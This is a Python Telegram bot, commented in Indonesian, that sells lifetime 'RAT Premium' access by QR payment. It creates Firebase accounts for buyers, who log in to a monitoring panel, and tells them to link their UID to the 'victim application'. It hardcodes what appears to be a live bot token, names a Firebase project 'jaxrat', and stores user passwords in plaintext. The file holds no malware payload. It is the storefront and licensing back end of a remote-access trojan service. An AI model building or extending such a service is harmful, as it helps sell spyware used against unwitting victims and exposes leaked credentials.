import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import firebase_admin
from firebase_admin import credentials, db, auth
import json
import requests
import os
from flask import Flask, request
import threading
import time
import qrcode
from io import BytesIO

# ========== KONFIGURASI ==========
BOT_TOKEN = "8019851816:AAFytb4-6Owqdttdhja77wqabJt8p_ZUaho"
OWNER_CHAT_ID = "6754308724"  # Chat ID owner @deakfta
GROUP_LINK = "https://t.me/pangeranjendral"
PRICE = 50000  # Harga dalam Rupiah

# Firebase Admin SDK (Service Account)
# Lo harus download service account dari Firebase Console
# Project Settings -> Service Accounts -> Generate New Private Key
# Isi creds di bawah pake isi file JSON nya
FIREBASE_CRED = {
  "type": "service_account",
  "project_id": "jaxrat-6813c",
  "private_key_id": "ISI_DARI_FILE_JSON",
  "private_key": "ISI_DARI_FILE_JSON",
  "client_email": "firebase-adminsdk@jaxrat-6813c.iam.gserviceaccount.com",
  "client_id": "ISI",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk%40jaxrat-6813c.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

# Inisialisasi Firebase Admin
cred = credentials.Certificate(FIREBASE_CRED)
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://jaxrat-6813c-default-rtdb.firebaseio.com'
})

# Referensi database
ref_settings = db.reference('settings')
ref_users = db.reference('users')
ref_premium = db.reference('premium_users')

# Set owner UID di Firebase
owner_uid = "OWNER_FIREBASE_UID"  # Ganti dengan UID Firebase lo nanti
ref_settings.child('owner_uid').set(owner_uid)
ref_settings.child('users_db').set({})

# Inisialisasi Bot
bot = telebot.TeleBot(BOT_TOKEN)

# ========== FLASK UNTUK WEBHOOK ==========
server = Flask(__name__)

# Simpan status pembayaran sementara
pending_payments = {}

# ========== FUNGSI QRIS ==========
def generate_qris(amount):
    # Ini simulasi, nanti lo ganti pake payment gateway beneran
    # Atau lo bisa generate QRIS statis lalu manual
    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(f"Payment {amount} to @deakfta")
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    bio = BytesIO()
    bio.name = 'qris.png'
    img.save(bio, 'PNG')
    bio.seek(0)
    return bio

# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = str(message.chat.id)
    
    # Cek apakah user udah premium
    premium_check = ref_premium.get()
    if premium_check and chat_id in premium_check:
        bot.reply_to(message, "✅ Kamu sudah premium! Akses panel: https://panel-lo.vercel.app")
        return
    
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("💳 Beli Akses 50rb", callback_data="buy"),
        InlineKeyboardButton("👥 Join Grup", url=GROUP_LINK)
    )
    
    bot.send_message(
        chat_id,
        "🔐 *Selamat datang di RAT Premium*\n\n"
        "Harga: Rp 50.000 (sekali bayar, akses seumur hidup)\n"
        "Fitur:\n"
        "• Panel monitoring real-time\n"
        "• Akses ke semua fitur RAT\n"
        "• Update gratis\n\n"
        "Klik tombol di bawah untuk memulai!",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "buy")
def buy_callback(call):
    chat_id = str(call.message.chat.id)
    
    # Generate QRIS
    qris_img = generate_qris(PRICE)
    
    # Simpan pending payment
    pending_payments[chat_id] = {
        'status': 'waiting',
        'timestamp': time.time()
    }
    
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("✅ Sudah Bayar", callback_data="confirm_payment"),
        InlineKeyboardButton("❌ Batal", callback_data="cancel")
    )
    
    bot.send_photo(
        chat_id,
        qris_img,
        caption=f"💳 *Scan QRIS di atas*\n\n"
                f"Total: Rp {PRICE:,}\n"
                f"Batas waktu: 30 menit\n\n"
                f"Setelah bayar, klik 'Sudah Bayar' dan kirim bukti transfer.",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "confirm_payment")
def confirm_payment(call):
    chat_id = str(call.message.chat.id)
    
    if chat_id not in pending_payments:
        bot.answer_callback_query(call.id, "Session expired. Mulai lagi dengan /start")
        return
    
    bot.send_message(
        chat_id,
        "📤 *Kirim Bukti Transfer*\n\n"
        "Kirim screenshot bukti transfer ke @deakfta (OWNER)\n"
        "Setelah itu owner akan mengaktifkan akunmu.",
        parse_mode="Markdown"
    )
    
    # Notifikasi owner
    bot.send_message(
        OWNER_CHAT_ID,
        f"🧾 *Konfirmasi Pembayaran*\n"
        f"Dari: {chat_id}\n"
        f"Username: @{call.from_user.username}\n"
        f"Nama: {call.from_user.first_name}\n\n"
        f"Chat user untuk minta bukti transfer!",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['adduser'])
def adduser(message):
    if str(message.chat.id) != OWNER_CHAT_ID:
        bot.reply_to(message, "❌ Lo bukan owner!")
        return
    
    # Format: /adduser <chat_id> <email> <password>
    try:
        _, target_chat_id, email, password = message.text.split()
    except:
        bot.reply_to(message, "Format: /adduser <chat_id> <email> <password>")
        return
    
    # Buat user di Firebase Auth
    try:
        user = auth.create_user(
            email=email,
            password=password,
            email_verified=True
        )
        
        # Simpan ke database
        user_data = {
            'email': email,
            'password': password,  # JANGAN simpan password di production, ini cuma contoh
            'chat_id': target_chat_id,
            'created_at': time.time(),
            'active': True
        }
        
        ref_users.child(user.uid).set(user_data)
        ref_premium.child(target_chat_id).set(user.uid)
        
        # Kirim notifikasi ke user
        bot.send_message(
            target_chat_id,
            "✅ *Akses Diaktifkan!*\n\n"
            f"Email: `{email}`\n"
            f"Password: `{password}`\n\n"
            f"🔗 Login Panel: https://panel-lo.vercel.app\n"
            f"UID Firebase lo: `{user.uid}`\n\n"
            f"Simpan UID ini untuk dihubungkan ke aplikasi victim!",
            parse_mode="Markdown"
        )
        
        bot.reply_to(message, f"✅ User diaktifkan! UID: {user.uid}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ========== RUN BOT ==========
@server.route('/bot', methods=['POST'])
def get_message():
    json_str = request.get_data().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return '!', 200

@server.route('/')
def webhook():
    bot.remove_webhook()
    bot.set_webhook(url='https://namaproject-lo.replit.app/bot')
    return "Bot running!", 200

def run_flask():
    server.run(host='0.0.0.0', port=8080)

if __name__ == "__main__":
    # Hapus webhook lama kalau ada
    bot.remove_webhook()
    time.sleep(1)
    # Set webhook ke URL Replit
    bot.set_webhook(url='https://namaproject-lo.replit.app/bot')
    
    # Jalankan Flask di thread terpisah
    threading.Thread(target=run_flask, daemon=True).start()
    
    # Keep main thread alive
    while True:
        time.sleep(60)
        # Cek pending payments expired (lebih dari 30 menit)
        current_time = time.time()
        expired = []
        for chat_id, data in pending_payments.items():
            if current_time - data['timestamp'] > 1800:  # 30 menit
                expired.append(chat_id)
        
        for chat_id in expired:
            del pending_payments[chat_id]
